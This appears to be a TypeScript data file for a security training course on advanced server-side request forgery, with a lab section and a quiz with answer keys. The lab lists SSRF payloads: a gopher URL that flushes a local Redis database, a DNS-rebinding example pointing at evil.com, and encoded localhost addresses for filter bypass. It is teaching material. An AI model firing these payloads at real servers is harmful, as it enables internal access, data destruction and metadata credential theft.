import { CourseModule } from '../../../types/course';

export const ssrfLevel2Modules: CourseModule[] = [
  {
    id: 'ssrf-level2-intro',
    title: 'Level 2: Advanced SSRF Techniques',
    duration: '2h',
    type: 'video',
    status: 'available',
    description: 'Master advanced SSRF exploitation techniques and bypass methods.',
    videoUrl: 'https://example.com/videos/advanced-ssrf',
  },
  {
    id: 'ssrf-level2-lab',
    title: 'Advanced SSRF Lab',
    duration: '3h',
    type: 'lab',
    status: 'available',
    description: 'Practice advanced SSRF techniques and filter bypass methods.',
    labInstructions: `
Advanced SSRF Laboratory

1. Advanced Techniques:
   - Filter bypass methods
   - Protocol smuggling
   - DNS rebinding
   - IPv6 bypass techniques

2. Advanced Exploitation:
   \`\`\`javascript
   // Protocol smuggling example
   gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20mykey%20%22myvalue%22%0D%0A

   // DNS rebinding setup
   // evil.com points to 127.0.0.1
   http://evil.com:11211/

   // IPv6 representation
   http://[::1]:8080/
   http://[0:0:0:0:0:ffff:127.0.0.1]
   \`\`\`

3. Advanced Bypass Techniques:
   - URL encoding tricks
   - Redirections
   - Alternative IP representations
   - Cloud metadata endpoints

4. Testing Methodology:
   \`\`\`javascript
   // URL parser bypass
   const bypassTests = [
    'http://127.1',
    'http://0x7f.0x0.0x0.0x1',
    'http://2130706433',
    'http://017700000001',
    'http://0x7f000001',
  ];

   // Redirection chain testing
   async function testRedirects(url) {
     const response = await fetch(url, { redirect: 'follow' });
     console.log('Final URL:', response.url);
     return response;
   }
   \`\`\`

5. Cloud Service Testing:
   - AWS metadata endpoints
   - GCP metadata service
   - Azure instance metadata
   - Kubernetes API server
    `,
  },
  {
    id: 'ssrf-level2-quiz',
    title: 'Advanced SSRF Assessment',
    duration: '1h',
    type: 'quiz',
    status: 'available',
    description: 'Test your knowledge of advanced SSRF techniques.',
    questions: [
      {
        question: 'What is DNS rebinding in SSRF attacks?',
        options: [
          'A technique to bypass hostname restrictions by changing DNS records',
          'A way to modify DNS servers',
          'A method to encrypt DNS requests',
          'A tool for DNS enumeration',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which protocol can be used for SSRF to interact with Redis?',
        options: [
          'gopher://',
          'http://',
          'ftp://',
          'ssh://',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is the purpose of IPv6 in SSRF bypass techniques?',
        options: [
          'To bypass filters that only check IPv4 addresses',
          'To improve connection speed',
          'To enable encryption',
          'To compress requests',
        ],
        correctAnswer: 0,
      },
    ],
  },
];